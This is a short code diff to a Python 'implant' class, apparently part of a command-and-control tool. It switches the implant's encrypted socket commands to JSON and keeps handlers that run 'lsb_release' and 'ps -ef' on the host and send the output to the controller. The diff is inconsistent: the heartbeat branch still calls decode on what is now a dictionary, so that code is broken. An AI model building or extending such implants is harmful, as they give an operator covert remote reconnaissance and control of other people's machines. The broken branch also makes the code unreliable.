@@ -64,19 +64,19 @@ class implant:
             data = self.sock.recv(int(data_len.decode()))
             aes = C2_AES(self.aes_secret)
             data = aes.decrypt(data)
-            print(f"Recieved {data.decode()}")
-            if data.decode() == "test":
+            data = json.loads(data)
+            print(f"Recieved {data['command']}")
+            if data['command'] == "test":
                 print("Sending synack...")
                 time.sleep(1)
                 self.send_msg("synack")
-            elif data.decode() == "lsb_release":
+            elif data['command'] == "lsb_release":
                 data = subprocess.check_output(['lsb_release', '-a'])
                 self.send_msg(data.decode())
-            elif data.decode() == "ps":
+            elif data['command'] == "ps":
                 data = subprocess.check_output(['ps', '-ef'])
                 self.send_msg(data.decode())
             elif data.decode() == "heartbeat":
-                print("recieved heartbeat")
                 self.send_msg("im alive")
 
     def intro(self):
